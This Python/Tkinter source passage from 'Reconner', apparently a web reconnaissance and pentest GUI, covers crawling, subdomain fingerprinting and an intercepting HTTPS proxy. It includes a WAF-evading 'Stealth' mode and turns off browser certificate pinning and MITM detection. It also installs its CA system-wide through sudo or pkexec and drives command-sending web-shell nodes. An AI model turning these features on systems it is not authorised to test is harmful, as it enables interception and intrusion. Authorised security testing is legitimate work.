            v = tk.StringVar(value=value)
            setattr(app, name, v)
            return v

        # ── Row 1: inputs (banner | URL | max pages) ──
        top = tk.Frame(self.toolbar, bg=C['bg'])
        top.pack(fill='x', padx=4, pady=(3, 1))

        def lbl(text, bold=False):
            """Build a toolbar label, bold when `bold`."""
            return tk.Label(top, text=text, bg=C['bg'],
                            font=C['font_b'] if bold else C['font'])

        logo = self._make_widget(top, {'type': 'logo', 'size': 28,
                                       'text': ' RECONNER  ',
                                       'fallback': '  [R] RECONNER  '}, None, None)
        app.target_ent = Entry95(top, textvariable=mkvar('target_var'), width=18)
        app.target_ent.bind('<Return>', lambda e: app._scan_start())
        # Scope (glob/regex) sits to the right of the URL: it constrains the crawl
        # AND the proxy — out-of-scope requests are never sent. '*' is a wildcard;
        # comma/newline separates OR'd patterns. Empty = no restriction. Committing
        # (Enter) re-applies it to a running proxy.
        app.scope_ent = Entry95(top, textvariable=mkvar('scope_var'), width=18)
        app.scope_ent.bind('<Return>', lambda e: app._apply_scope())

        # (widget, column weight, sticky). The URL and Scope entries share the
        # stretch (weight 1 each); fixed cells stay weight 0. Per-host auth is
        # handled by the Auth-scan popup. The crawl is unbounded (no max-pages cap);
        # concurrency is set in Settings ▸ Performance.
        cells = [
            (logo,                          0, ''),
            (lbl('Target URL:', True),      0, 'w'),
            (app.target_ent,                1, 'ew'),
            (lbl('Scope:', True),           0, 'w'),
            (app.scope_ent,                 1, 'ew'),
        ]
        for col, (w, weight, sticky) in enumerate(cells):
            w.grid(row=0, column=col, sticky=sticky, padx=2, pady=1)
            top.grid_columnconfigure(col, weight=weight)

        # ── Row 2: actions ──
        bot = tk.Frame(self.toolbar, bg=C['bg'])
        bot.pack(fill='x', padx=4, pady=(1, 3))
        Btn(bot, text=' Tech Scan ',
            command=app._fingerprint_start).pack(side='left', padx=2)
        self._build_modes_menu(bot)
        # Auth scan toggle — when on, the scan prompts for per-host credentials
        # on demand (see _maybe_prompt_auth). Sits just left of SCAN TARGET.
        app.auth_scan_var = tk.BooleanVar(value=False)
        tk.Label(bot, text='Auth Scan', bg=C['bg'],
                 font=C['font']).pack(side='left', padx=(8, 2))
        ToggleSwitch(bot, variable=app.auth_scan_var).pack(side='left', padx=(0, 4))
        # (Probe POST is gone — discovered non-GET endpoints are auto-probed when
        # their path is allowlisted + non-destructive; control it in the
        # Settings ▸ Performance tab.)
        app.scan_btn = Btn(bot, text='  SCAN TARGET  ', command=app._scan_start,
                           bg='#2e7d32', fg='white')
        app.scan_btn.pack(side='left', padx=2)
        app.stop_btn = Btn(bot, text=' STOP ', command=app._scan_stop,
                           bg='#b71c1c', fg='white', state='disabled')
        app.stop_btn.pack(side='left', padx=2)
        app.progress = Chicago95Progress(bot, width=150, height=16)
        app.progress.pack(side='left', padx=6)
        app.status_box = StatusBox(bot, size=18)
        app.status_box.pack(side='left', padx=2)
        Btn(bot, text='⚙ Settings',
            command=app._open_settings).pack(side='right', padx=2)

    def _build_modes_menu(self, parent):
        """The Modes dropdown (styled like the graph's Menu button): two grouped
        choices that are always both active — the scan INTENSITY (Stealth /
        Normal / Aggressive) and the scan TYPE (Browser crawl / Fuzzing)."""
        app = self.app
        app.scan_mode_var = tk.StringVar(value=DEFAULT_SCAN_MODE)
        app.scan_type_var = tk.StringVar(value='browser')
        btn = tk.Menubutton(parent, text='Modes ▾', bg=C['btn'],
                            activebackground=C['btn'], relief='raised', bd=2,
                            font=C['font'], padx=6, highlightthickness=0)
        menu = tk.Menu(btn, tearoff=0, bg=C['btn'], fg=C['black'],
                       activebackground=C['sel_bg'], activeforeground=C['sel_fg'],
                       font=C['font'])
        descs = {
            'Stealth':    'slip under WAF / rate limits, don\'t disrupt the target',
            'Normal':     'balanced footprint, standard probes',
            'Aggressive': 'no throttle, every probe — doesn\'t spare the service',
        }
        menu.add_command(label='Intensity', state='disabled')
        for m in ('Stealth', 'Normal', 'Aggressive'):
            menu.add_radiobutton(
                label=f'{m}  ·  {descs[m]}', value=m, variable=app.scan_mode_var,
                command=lambda mm=m: app._status(f'Scan mode: {mm}'))
        menu.add_separator()
        menu.add_command(label='Type', state='disabled')
        type_descs = {
            'browser': ('Browser', 'crawl & navigate the target like a user'),
            'fuzzing': ('Fuzzing', 'path-wordlist discovery only, no browser, '
                                   'no whitelist'),
        }
        for val, (lbl, d) in type_descs.items():
            menu.add_radiobutton(
                label=f'{lbl}  ·  {d}', value=val, variable=app.scan_type_var,
                command=lambda vv=val: app._status(
                    f'Scan type: {vv.capitalize()}'))
        btn.config(menu=menu)
        btn.pack(side='left', padx=2)

    # ── statusbar matrix + build ──────────────────────────────────────
    def statusbar_matrix(self):
        """One row per status-bar widget. The status (left, stretches) and the
        node count (right) carry live variables; the Ollama/Selenium badges show
        availability, computed here so the data row holds the final text/colour."""
        # The Merlin button is packed before the node count so that — both being
        # side='right' — it lands at the far right, immediately right of 'Nodes:'.
        # Stash its hat icon on the app so Tk keeps a reference.
        self.app._merlin_icon = _merlin_hat_photo(18)
        merlin_btn = {'type': 'button', 'command': '_open_wizard',
                      'attr': 'merlin_btn', 'side': 'right',
                      'opts': {'padx': 4, 'pady': 1}}
        if self.app._merlin_icon is not None:
            merlin_btn['opts'].update(image=self.app._merlin_icon,
                                      compound='center')
        else:
            merlin_btn['text'] = 'M'        # fallback if the PNG won't load
        rows = [
            {'type': 'label', 'var': 'status_var', 'var_value': 'Ready',
             'side': 'left', 'fill': 'x', 'expand': True,
             'opts': {'anchor': 'w', 'padx': 6}},
            merlin_btn,
            {'type': 'label', 'var': 'count_var', 'var_value': 'Nodes: 0',
             'side': 'right', 'opts': {'padx': 8, 'relief': 'sunken'}},
        ]
        for ok, label in [(OLLAMA_AVAILABLE, 'Ollama'),
                          (SELENIUM_AVAILABLE, 'Selenium')]:
            rows.append({'type': 'label', 'side': 'right',
                         'text': f'{label}: {"OK" if ok else "missing"}',
                         'fg': C['ok'] if ok else C['err'],
                         'opts': {'padx': 8, 'relief': 'sunken'}})
        return rows

    def build_statusbar(self):
        """Create the bottom status bar from the statusbar matrix."""
        sb = tk.Frame(self.root, bg=C['bg'], relief='sunken', bd=1)
        sb.pack(side='bottom', fill='x')
        self.statusbar = sb
        self.build_bar(sb, self.statusbar_matrix())

    # ── main area (Site Structure | Proxy, with the inspector below) ──────
    def build_main(self):
        """Build the main work area: a horizontal split with the Site Structure
        tree on the left (narrow, ~1/5) and the Proxy panel on the right, and the
        node Inspector spanning the full width below both. Handles are stored on
        the app."""
        app = self.app
        main = tk.Frame(self.root, bg=C['bg'])
        main.pack(fill='both', expand=True, padx=4, pady=4)

        # Inspector first (bottom, full width, fixed height) so the split above
        # claims the rest.
        app.info_panel = InfoPanel(main, ai=app.ai,
                                   on_new_node=app._add_edited_node,
                                   on_create_shell=app._create_shell_node)
        app.info_panel.pack(side='bottom', fill='x', pady=(4, 0))
        app.info_panel.configure(height=300)
        app.info_panel.pack_propagate(False)

        # Top: fixed Site Structure | Proxy split. Site Structure is pinned to a
        # left column just wide enough to hold its dropdown row with symmetric
        # left/right margins (a container with pack_propagate off, sized after the
        # row is realised); the Proxy panel fills the rest. The 4px gap before the
        # Proxy panel matches the inspector's 4px gap below.
        top = tk.Frame(main, bg=C['bg'])
        top.pack(side='top', fill='both', expand=True)
        self._ss_left = tk.Frame(top, bg=C['bg'], width=220)
        self._ss_left.pack(side='left', fill='y')
        self._ss_left.pack_propagate(False)
        app.graph_panel = GraphPanel(self._ss_left, on_select=app._node_selected,
                                     on_clear=app._clear,
                                     on_save_json=app._save_json,
                                     on_save_json_all=app._save_json_all,
                                     on_load_json=app._load_json,
                                     on_delete=app._delete_node,
                                     on_deselect=app._node_deselected,
                                     scope_var=app.scope_var)
        app.graph_panel.pack(fill='both', expand=True)
        app.proxy_panel = ProxyPanel(top, controller=app.proxy,
                                     on_open_browser=app._open_browser,
                                     on_save_node=app._save_proxy_saved_node,
                                     on_repeat_node=app._repeat_proxy_saved_node)
        app.proxy_panel.pack(side='left', fill='both', expand=True, padx=(4, 0))
        # Shrink the left column to fit the dropdown row exactly (symmetric gaps).
        self.root.after(120, self._fit_site_structure)
        # Let the graph's right-click node menu drive the inspector's tools, and
        # give the proxy controller a way to paint trapped flows.
        app.graph_panel.info_panel = app.info_panel
        if app.proxy is not None:
            app.proxy_panel.set_controller(app.proxy)

    def _fit_site_structure(self):
        """Size the Site Structure column to its dropdown row's natural width so
        the gap from the Filter button to the right border matches the gap from
        the left border to the Subdomains button (symmetric margins)."""
        try:
            gp = self.app.graph_panel
            gp.update_idletasks()
            # ctrl reqwidth covers the buttons + their inter-paddings; add the
            # control row's own padx (4 each side) and the panel's border (bd 2).
            w = gp._ctrl.winfo_reqwidth() + 2 * 4 + 2 * 2
            self._ss_left.config(width=max(120, w))
        except Exception:
            pass


# ─────────────────────────────────────────────
# app — master class
# ─────────────────────────────────────────────
class app:
    """Master class. Wires the other classes together and runs the program:
    builds the window, delegates widget construction to `gui`, creates the
    `ollama` AI client and the `scan` engine, opens the `inspector` tools, and
    uses `helper` utilities. (Currently still hosts the statusbar/main-panel
    construction and the run loop; those can move into `gui` in a later pass.)"""
    def __init__(self):
        """Create the main window, load settings, build the AI client, scanner
        state and all panels/toolbar, leaving the app ready to run()."""
        self.root = tk.Tk()
        self.root.title('Reconner')
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        # Resizable. Default to the left half of the screen on first run; restore
        # the last saved geometry on subsequent runs. The toolbar reflows to the
        # current width, so any size works.
        saved_geom = load_settings().get('window_geometry') or ''
        try:
            self.root.geometry(saved_geom or f'{sw // 2}x{sh}+0+0')
        except Exception:
            self.root.geometry(f'{sw // 2}x{sh}+0+0')
        self.root.resizable(True, True)
        self.root.minsize(640, 400)

        self.settings = load_settings()
        apply_font_size(self.settings.get('font_size', 8))
        apply_theme(self.root)

        # Window/taskbar icon (same image as the toolbar logo & menu launcher).
        self._win_icon = _app_icon_photo(64)
        if self._win_icon is not None:
            try:
                self.root.iconphoto(True, self._win_icon)
            except Exception:
                pass

        self.ai = ollama(
            model=self.settings.get('model', 'reconner-ai'),
            host=self.settings.get('ollama_host', ''),
            temperature=self.settings.get('temperature', 0.7),
        )
        self.scanner: "scan | None" = None
        self._sub_scanners = []
        self._sub_hosts = set()
        self._sub_pending = deque()
        self._sub_running = 0
        # Concurrent browser throttle: at most this many subdomain crawls run at
        # once (the primary crawl + up to N-1 subs); the rest wait in
        # _sub_pending. There is NO cap on the total number of subdomains found,
        # fingerprinted or crawled — this only limits how many run simultaneously.
        # User-configurable in Settings ▸ Performance (see _on_settings_apply).
        self._MAX_CONCURRENT_SUBS = max(
            1, int(self.settings.get('max_concurrent_browsers', 5)))
        # Bounded pool for fingerprint (Tech Scan) jobs. Subdomain discovery is
        # unbounded and each host is fingerprinted, so in Aggressive mode crt.sh
        # can surface hundreds at once; without a pool that's hundreds of
        # simultaneous HTTP/nmap/whatweb threads. The pool queues the overflow and
        # runs a fixed number at a time. Independent of the browser throttle —
        # fingerprinting is cheap HTTP, so it gets its own budget. Resized on
        # Apply by _on_settings_apply (the executor itself can't be resized live,
        # so it's swapped for a new one).
        self._fp_pool_size = max(
            1, int(self.settings.get('max_fingerprint_workers', 8)))
        self._fp_pool = ThreadPoolExecutor(
            max_workers=self._fp_pool_size, thread_name_prefix='fp')
        self._active_scans = 0
        self._scan_params = {}
        self._primary_failed = self._primary_stopped = False
        self._settings_popup = None
        # Rolling session log: every status-bar line is kept here so the Settings
        # ▸ Logs tab can show the full history (capped to bound memory).
        self._log_lines = deque(maxlen=2000)
        self._fp_popup = None
        self._tech_cancelled = False
        self._tech_hosts = set()
        # target URL -> {'fp': str, 'ai': str | None}.  Same target reuses the
        # cached scan; changing the URL re-runs the fingerprint.
        self.fingerprint_cache: dict[str, dict] = {}

        # Thread→UI marshalling: proxy handler threads enqueue callables here and
        # a periodic pump drains them on the Tk main thread (Tcl isn't thread-safe,
        # so root.after() can't be called directly from a worker thread).
        self._ui_queue: "queue.Queue" = queue.Queue()
        # Intercepting proxy controller. Callbacks run on the Tk thread (drained
        # from _ui_queue) so they can touch widgets directly. The ProxyPanel is
        # wired to it in build_main; the listener starts after the UI is up.
        self.proxy = InterceptProxy(
            port=int(self.settings.get('proxy_port', 8080)),
            on_show=self._proxy_show,
            on_node=self._proxy_node,
            on_status=self._proxy_status,
            ui_call=self._ui_queue.put)

        # The whole GUI is built by the gui class from declarative matrices;
        # it stores widget/variable handles back on this app object.
        self.gui = gui(self)
        self.gui.build_toolbar()
        self.gui.build_statusbar()
        self.gui.build_main()
        # Start the proxy listener (best effort) and seed its scope from the field.
        self.proxy.set_scope(self.scope_var.get())
        self.proxy.start()
        # Begin draining proxy→UI callbacks on the main thread.
        self.root.after(50, self._drain_ui_queue)
        self._status('Ready. Enter a target URL and click SCAN.')

    # ── proxy glue ──────────────────────────────────────────────────
    def _drain_ui_queue(self):
        """Run any callbacks queued by proxy worker threads on the Tk main thread,
        then reschedule. This is the thread-safe marshalling path into the UI."""
        try:
            while True:
                fn = self._ui_queue.get_nowait()
                try:
                    fn()
                except Exception:
                    pass
        except queue.Empty:
            pass
        try:
            self.root.after(50, self._drain_ui_queue)
        except Exception:
            pass

    def _apply_scope(self):
        """Scope field committed: apply it live to the proxy (and it's read by the
        next scan). Out-of-scope requests are never sent. An open History popup
        filters on this same scope, so refresh it too."""
        self.proxy.set_scope(self.scope_var.get())
        self._status(f'Scope applied: {self.scope_var.get().strip() or "(none)"}')
        win = getattr(getattr(self, 'proxy_panel', None), '_history_win', None)
        if win is not None:
            try:
                win._rebuild_list()
            except Exception:
                pass

    def _proxy_show(self, flow):
        """Controller hook (UI thread): paint the trapped flow in the proxy panel."""
        if getattr(self, 'proxy_panel', None) is not None:
            self.proxy_panel.show_item(flow)

    def _proxy_status(self, msg):
        """Controller hook (UI thread): reflect a proxy status line and re-sync the
        proxy toolbar (start/stop changes which buttons are enabled)."""
        if getattr(self, 'proxy_panel', None) is not None:
            self.proxy_panel.set_status(msg)
            self.proxy_panel._update_buttons()
        self._status(f'Proxy: {msg}')

    def _proxy_node(self, flow):
        """Controller hook (UI thread): record a completed proxied transaction as a
        SiteNode so it appears in the Site Structure tree, and add it to the proxy
        panel's traffic history."""
        if getattr(self, 'proxy_panel', None) is not None:
            try:
                self.proxy_panel.record_flow(flow)
            except Exception:
                pass
        try:
            node = SiteNode(url=flow.url, node_type=self._proxy_node_type(flow),
                            parent_url=None)
            node.req_method  = flow.method
            node.req_url     = flow.url
            node.req_headers = dict(flow.req_headers)
            node.req_body    = (flow.req_body.decode('utf-8', 'replace')
                                if isinstance(flow.req_body, bytes) else flow.req_body)
            node.headers     = dict(flow.req_headers)
            node.status_code = flow.status
            node.resp_status = flow.status
            node.resp_reason = flow.reason
            node.resp_headers = dict(flow.resp_headers)
            body = (flow.resp_body.decode('utf-8', 'replace')
                    if isinstance(flow.resp_body, bytes) else (flow.resp_body or ''))
            node.resp_body   = body
            node.content_type = flow.resp_headers.get('Content-Type', '')
            node.raw_html    = body
            node.text_content = body
            node.scanned     = True
            self.graph_panel.add_node(node)
            self.count_var.set(f'Nodes: {len(self.graph_panel.nodes)}')
        except Exception:
            pass

    @staticmethod
    def _proxy_node_type(flow):
        """Classify a proxied transaction into a node type for the tree icon."""
        ct = (flow.resp_headers.get('Content-Type', '') or '').lower()
        path = (urlparse(flow.url).path or '').lower()
        if flow.status and 300 <= flow.status < 400:
            return 'redirect'
        if 'javascript' in ct or path.endswith('.js'):
            return 'script'
        if 'html' in ct:
            return 'page'
        if any(path.endswith(e) for e in ('.css', '.png', '.jpg', '.jpeg', '.gif',
                                          '.svg', '.ico', '.woff', '.woff2', '.ttf')):
            return 'file'
        if 'json' in ct or 'xml' in ct:
            return 'endpoint'
        return 'page'

    # ── open the system browser through the proxy ────────────────────
    def _open_browser(self):
        """Launch the system browser routed through the proxy (CA trusted) so the
        user can browse and the proxy intercepts. Best-effort across Firefox then
        Chromium; falls back to a message with the CA path + manual steps."""
        self.proxy.start()
        port = self.proxy.port
        # Open the target if one is set, otherwise launch with no page (the
        # browser's own home/blank page) — don't force an example site.
        url = self.target_var.get().strip()
        try:
            if self._launch_firefox(url, port):
                return
            if self._launch_chromium(url, port):
                return
        except Exception as e:
            self._status(f'Browser launch error: {e}')
        messagebox.showinfo(
            'Open Browser',
            'Could not auto-launch a browser through the proxy.\n\n'
            f'Point your browser at proxy 127.0.0.1:{port} and trust the CA at:\n'
            f'{PROXY_CA_CERT}')

    def _launch_firefox(self, url, port):
        """Launch Firefox/Firefox-ESR in a dedicated Reconner profile configured
        to use the proxy, with the CA imported (certutil) and enterprise roots
        enabled. Returns True if launched."""
        exe = shutil.which('firefox') or shutil.which('firefox-esr')
        if not exe:
            return False
        profile = SETTINGS_DIR / 'browser-profile'
        profile.mkdir(parents=True, exist_ok=True)
        prefs = (
            'user_pref("network.proxy.type", 1);\n'
            'user_pref("network.proxy.http", "127.0.0.1");\n'
            f'user_pref("network.proxy.http_port", {port});\n'
            'user_pref("network.proxy.ssl", "127.0.0.1");\n'
            f'user_pref("network.proxy.ssl_port", {port});\n'
            'user_pref("network.proxy.share_proxy_settings", true);\n'
            'user_pref("network.proxy.allow_hijacking_localhost", true);\n'
            'user_pref("security.enterprise_roots.enabled", true);\n'
            # A CA imported into the profile is trusted for normal validation, but
            # Firefox's STATIC KEY PINNING for HSTS-preloaded sites (Google,
            # Mozilla, …) is only overridden by an OS/enterprise-store root — so
            # those sites would fail MITM interception with
            # MOZILLA_PKIX_ERROR_MITM_DETECTED. Disable pin enforcement in this
            # throwaway pentest profile so interception works everywhere.
            'user_pref("security.cert_pinning.enforcement_level", 0);\n'
            # Don't let Firefox second-guess our CA as hostile interception.
            'user_pref("security.certerrors.mitm.priming.enabled", false);\n'
            'user_pref("security.certerrors.mitm.auto_enable_enterprise_roots", false);\n'
            'user_pref("browser.shell.checkDefaultBrowser", false);\n'
            'user_pref("datareporting.policy.dataSubmissionEnabled", false);\n')
        try:
            (profile / 'user.js').write_text(prefs, encoding='utf-8')
        except Exception:
            pass
        self._ensure_firefox_ca_trust(profile)
        argv = [exe, '--no-remote', '--profile', str(profile)]
        if url:
            argv.append(url)
        self._browser_proc = subprocess.Popen(argv)
        self._status(f'Firefox launched through proxy 127.0.0.1:{port}')
        return True

    def _ensure_firefox_ca_trust(self, profile):
        """Make Firefox trust the proxy CA. Preferred: import it into the profile's
        NSS db with certutil (no sudo). Fallback when certutil is absent: install
        the CA into the system trust store (the profile sets
        security.enterprise_roots.enabled so Firefox then reads it) — otherwise
        warn the user, since without trust HTTPS interception fails."""
        if self._install_ca_into_firefox_profile(profile):
            return
        # certutil missing → rely on the system trust store + enterprise roots.
        if PROXY_CA_SYS_DST.exists():
            return
        if self._install_ca_system_noninteractive():
            return
        messagebox.showwarning(
            'Trust the Reconner CA',
            'Firefox must trust the Reconner proxy CA to intercept HTTPS, but '
            'certutil (libnss3-tools) is not installed and the CA is not in the '
            'system trust store — so HTTPS sites will show '
            'MOZILLA_PKIX_ERROR_MITM_DETECTED.\n\nFix it once with either:\n'
            '  • Settings ▸ Proxy ▸ Install into system trust (sudo), or\n'
            '  • sudo apt install libnss3-tools\n\n'
            f'…or import this file into Firefox manually (Settings ▸ Privacy ▸ '
            f'Certificates):\n{PROXY_CA_CERT}')

    @staticmethod
    def _install_ca_into_firefox_profile(profile) -> bool:
        """Import the proxy CA into a Firefox profile's NSS db (certutil). Returns
        True on success, False when certutil is unavailable / it fails."""
        certutil = shutil.which('certutil')
        if not certutil or not PROXY_CA_CERT.exists():
            return False
        try:
            r = subprocess.run([certutil, '-A', '-n', 'Reconner Proxy CA',
                                '-t', 'C,,', '-i', str(PROXY_CA_CERT),
                                '-d', f'sql:{profile}'],
                               check=False, capture_output=True, timeout=15)
            return r.returncode == 0
        except Exception:
            return False

    def _install_ca_system_noninteractive(self) -> bool:
        """Install the CA into the system trust store without a manual prompt:
        try passwordless sudo, then pkexec (graphical prompt). Returns success."""
        if not PROXY_CA_CERT.exists():
            return False
        cmd = (f'install -m644 "{PROXY_CA_CERT}" "{PROXY_CA_SYS_DST}" '
               '&& update-ca-certificates')
        for runner in (['sudo', '-n', 'sh', '-c', cmd],
                       ['pkexec', 'sh', '-c', cmd]):
            if not shutil.which(runner[0]):
                continue
            try:
                r = subprocess.run(runner, capture_output=True, timeout=120)
                if r.returncode == 0:
                    self._status('Reconner CA installed into the system trust '
                                 'store.')
                    return True
            except Exception:
                pass
        return False

    def _launch_chromium(self, url, port):
        """Launch Chromium/Chrome through the proxy in a dedicated profile,
        ignoring cert errors (so the minted leaf certs are accepted). Returns True
        if launched."""
        exe = (shutil.which('chromium') or shutil.which('chromium-browser')
               or shutil.which('google-chrome') or shutil.which('chrome'))
        if not exe:
            return False
        udd = str(SETTINGS_DIR / 'chromium-profile')
        argv = [exe, f'--proxy-server=127.0.0.1:{port}',
                f'--user-data-dir={udd}', '--ignore-certificate-errors',
                '--no-first-run', '--no-default-browser-check']
        if url:
            argv.append(url)
        self._browser_proc = subprocess.Popen(argv)
        self._status(f'Chromium launched through proxy 127.0.0.1:{port}')
        return True

    def _open_settings(self):
        """Open the Settings dialog (raising the existing one if already open)."""
        if self._settings_popup is not None and self._settings_popup.winfo_exists():
            self._settings_popup.lift()
            self._settings_popup.focus_force()
            return
        self._settings_popup = SettingsDialog(
            self.root, self.settings, self._on_settings_apply, self.ai,
            get_log=self._get_log, clear_log=self._clear_log)

    def _on_settings_apply(self, s):
        """Apply newly-saved settings: update the AI client, concurrency limits and
        the proxy port (restarting the listener if it changed)."""
        self.settings = s
        self.ai.model = s.get('model', 'reconner-ai')
        self.ai.host = s.get('ollama_host', '')
        self.ai.temperature = s.get('temperature', 0.7)
        # Live-update an open Wizard so its next reply uses the new model.
        win = getattr(self, '_wizard_win', None)
        if win is not None and win.winfo_exists():
            win.model = s.get('wizard_model', 'wizard-ai')
        # Concurrent-browser cap: apply live so raising it mid-scan immediately
        # frees slots for any queued subdomain crawls.
        self._MAX_CONCURRENT_SUBS = max(1, int(s.get('max_concurrent_browsers', 5)))
        self._pump_sub_queue()
        # Fingerprint-pool size: the executor can't be resized live, so when it
        # changes, swap in a new pool and let the old one drain its in-flight
        # jobs (shutdown without cancel) so nothing already queued is lost.
        fp_n = max(1, int(s.get('max_fingerprint_workers', 8)))
        if fp_n != self._fp_pool_size:
            old = self._fp_pool
            self._fp_pool_size = fp_n
            self._fp_pool = ThreadPoolExecutor(
                max_workers=fp_n, thread_name_prefix='fp')
            try:
                old.shutdown(wait=False)
            except Exception:
                pass
        # Proxy port: apply live (restarts the listener if it was running).
        if hasattr(self, 'proxy') and self.proxy is not None:
            self.proxy.set_port(int(s.get('proxy_port', 8080)))
        self._status('Settings applied.')

    def _fp_hosts(self):
        """(host_label, target_url) for every fingerprinted host, entry host first
        then the rest alphabetically — feeds the Tech Scan popup's Subdomains
        dropdown."""
        entry = self.target_var.get().strip()
        items = []
        for url in self.fingerprint_cache:
            host = _host_only(urlparse(url).netloc) or url
            items.append((host, url))
        items.sort(key=lambda x: (x[1] != entry, x[0]))
        return items

    def _fingerprint_start(self):
        """The Tech Scan button is a viewer — the scan runs automatically with
        SCAN TARGET, once per discovered host. The popup's Subdomains dropdown
        switches which host's result is shown."""
        target = self.target_var.get().strip()
        if not target and not self.fingerprint_cache:
            messagebox.showinfo('No Target', 'Enter a target URL first.')
            return
        hosts = self._fp_hosts()
        current = (target if target in self.fingerprint_cache
                   else (hosts[0][1] if hosts else target))

        if self._fp_popup is None or not self._fp_popup.winfo_exists():
            self._fp_popup = FingerprintDialog(
                self.root, current, on_analyze=self._analyze_fp_request,
                on_select=self._fp_select_host)
        else:
            self._fp_popup.lift()
            self._fp_popup.focus_force()
        self._fp_popup.set_hosts(hosts, current)
        self._fp_select_host(current)

    def _fp_select_host(self, target):
        """Show a given host's tech scan in the popup (dropdown selection)."""
        if self._fp_popup is None or not self._fp_popup.winfo_exists():
            return
        self._fp_popup.target = target
        self._fp_popup.set_host_label(target)
        cached = self.fingerprint_cache.get(target)
        if cached and cached.get('fp'):
            self._fp_popup.set_fingerprint(cached['fp'])
            self._fp_popup.set_ai(self._ai_display(cached))
            self._status(f'Tech Scan: {target}')
        else:
            self._fp_popup.set_fingerprint(
                'No tech scan yet for this host.\n\n'
                'The tech scan runs automatically when you click SCAN TARGET — '
                'run a scan, then reopen this to view the detected technologies.')
            self._fp_popup.set_ai('(run a target scan first)')

    @staticmethod
    def _ai_display(entry):
        """Text to show in the AI pane given a cache entry's analysis state."""
        if entry.get('ai'):
            return entry['ai']
        if entry.get('ai_running'):
            return 'Analyzing… please wait.'
        return 'Click "Analyze with AI" for security insights.'

    def _analyze_fp_request(self):
        """Triggered by the Tech Scan popup's Analyze button — analyse the
        target the popup is showing."""
        if self._fp_popup is not None and self._fp_popup.winfo_exists():
            self._analyze_fp(self._fp_popup.target)

    def _analyze_fp(self, target):
        """Run (or re-show) the AI analysis for a target. The work runs in the
        background and writes its state to fingerprint_cache, so it keeps going
        and is recoverable even if the popup is closed and reopened later."""
        entry = self.fingerprint_cache.get(target)
        if not entry or not entry.get('fp'):
            return
        if entry.get('ai') or entry.get('ai_running'):
            self._show_fp_ai(target, self._ai_display(entry))
            return
        entry['ai_running'] = True
        fp_text = entry['fp']
        self._show_fp_ai(target, 'Analyzing… please wait.')

        def run():
            """Worker: analyse the fingerprint, cache the result, and show it."""
            try:
                insight = self.ai.analyze_fingerprint(fp_text)
            except Exception as e:
                insight = f'AI analysis error: {e}'
            entry['ai'] = insight
            entry['ai_running'] = False
            self.root.after(0, lambda: self._show_fp_ai(target, insight))

        threading.Thread(target=run, daemon=True).start()

    def _show_fp_ai(self, target, text):
        """Update the Tech Scan popup's AI pane only if it's still showing this
        target (so a background result never lands in the wrong popup)."""
        if (self._fp_popup is not None and self._fp_popup.winfo_exists()
                and self._fp_popup.target == target):
            self._fp_popup.set_ai(text)

    def _run_tech_scan(self, target, mode=None, reset_cancel=True):
        """Run the tech scan in the background as part of a target scan and cache
        the result (keyed by `target`) so the Tech Scan viewer and the JSON export
        can show it. The scan mode gates which probes run. Aborts promptly when the
        main STOP sets self._tech_cancelled. The primary call resets the cancel
        flag; per-subdomain calls (reset_cancel=False) share it and are de-duped by
        host so each discovered host is fingerprinted once."""
        if reset_cancel:
            self._tech_cancelled = False
        if mode is None:
            mode = self.scan_mode_var.get()
        # De-dupe so a host isn't fingerprinted twice (it's reached from the main
        # scan and possibly multiple references).
        key = self._tech_key(target)
        if key in self._tech_hosts:
            return
        self._tech_hosts.add(key)

        def run():
            """Worker: fingerprint the target, cache the result, and update the
            status/Tech-Scan popup."""
            try:
                text = fingerprint_target(
                    target, should_stop=lambda: self._tech_cancelled, mode=mode)
                if not (text or '').strip():
                    text = '(no technologies detected)'
            except Exception as e:
                text = f'Tech Scan error: {e}'
            if self._tech_cancelled:
                self.root.after(0, lambda: self._status(
                    f'Tech scan stopped: {target}'))
                return
            self._cache_fp(target, text)

            def update():
                """Report completion and refresh the popup if it shows this target."""
                self._status(f'Tech scan done: {target}')
                if (self._fp_popup is not None and self._fp_popup.winfo_exists()
                        and self._fp_popup.target == target):
                    self._fp_popup.set_fingerprint(text)
            self.root.after(0, update)

        # Submit to the bounded pool: at most max_workers fingerprints run at
        # once, the rest queue. A cancelled scan (STOP) still drains quickly
        # because each worker checks self._tech_cancelled.
        self._fp_pool.submit(run)

    def _cache_fp(self, target, fp_text):
        """Store a target's fingerprint text in the cache (preserving any AI
        analysis already attached)."""
        entry = self.fingerprint_cache.setdefault(target, {'fp': '', 'ai': None})
        entry['fp'] = fp_text

    @staticmethod
    def _tech_key(target):
        """Host used to de-dupe per-host fingerprints."""
        try:
            t = target if '://' in target else 'https://' + target
            return _host_only(urlparse(t).netloc) or target
        except Exception:
            return target

    # ── Helpers ─────────────────────────────
    def _status(self, msg):
        """Show a timestamped message in the status bar and append it to the
        rolling session log (shown in Settings ▸ Logs)."""
        ts = datetime.now().strftime('%H:%M:%S')
        line = f'[{ts}]  {msg}'
        self.status_var.set(line)
        self._log_lines.append(line)

    def _get_log(self) -> str:
        """The full session log as a single string (oldest first)."""
        return '\n'.join(self._log_lines)

    def _clear_log(self):
        """Clear the rolling session log."""
        self._log_lines.clear()

    def _node_selected(self, node: SiteNode):
        """Graph-selection callback: show `node` in the inspector."""
        self.info_panel.show(node)
        self._status(f'Selected: {node.url}')

    def _node_deselected(self):
        """Graph-deselection callback: clear the inspector."""
        self.info_panel.clear()
        self._status('Selection cleared.')

    def _create_shell_node(self, parent_node: SiteNode, name: str, param: str,
                           method: str = 'GET'):
        """Create a 'shell' node as a child of `parent_node` (Set Shell). The
        shell URL is the entered name resolved against the parent URL treated as
        a directory (node 'http://h/images' + 'shell.jpg' → '…/images/shell.jpg');
        `method` (GET/POST) is how the Web Shell terminal sends commands. The new
        node is wired as a child, added to the graph and selected so Open Shell is
        immediately available."""
        shell_url = _resolve_shell_url(parent_node.url, name)
        gp = self.graph_panel
        # Keep the URL unique so it gets its own vertex even if the shell path
        # already exists as a node.
        url = shell_url
        if url in gp.nodes:
            n = 1
            while f'{shell_url}#shell-{n}' in gp.nodes:
                n += 1
            url = f'{shell_url}#shell-{n}'
        new = SiteNode(url=url, node_type='shell', parent_url=parent_node.url)
        new.shell_name  = name
        new.shell_param = param
        new.shell_method = (method or 'GET').upper()
        new.title       = name
        new.scanned     = True
        new.edited      = True   # user-created: deletable + never locale-folded
        gp.add_node(new)
        # Build the tree now so the new child exists to select + reveal.
        if gp._build_id is not None:
            try:
                gp.after_cancel(gp._build_id)
            except Exception:
                pass
            gp._build_id = None
        gp._do_build()
        gp._select_and_center(url)
